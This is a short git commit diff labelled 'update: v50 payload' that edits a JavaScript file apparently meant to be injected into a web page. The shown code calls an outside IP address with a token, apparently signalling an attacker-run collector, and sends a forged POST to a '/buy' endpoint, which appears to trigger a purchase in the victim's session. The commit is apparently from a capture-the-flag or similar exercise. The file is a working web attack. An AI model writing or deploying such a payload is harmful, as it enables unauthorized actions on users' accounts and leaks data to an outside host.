fb5fb4f92ed655af07c468d9fb36b8a235145441
Any <fkd_any@qq.com>
2024-03-23 15:48:19 +0800

    update: v50 payload

--- v50.js
+++ v50.js
@@ -2,9 +2,10 @@
   fetch("http://124.222.247.149:20323/receive?token=lelecha")
   // const baseTag= document.getElementById("d");
   // baseTag.parentElement.removeChild(baseTag);
+  const mySearchParams1 = new URLSearchParams("?id=0");
   fetch("/buy",{
     method:"POST",
-    body:"id=0"
+    body:mySearchParams1,
   }).then((res)=>{
     return res.text();
   }).then((text)=>{
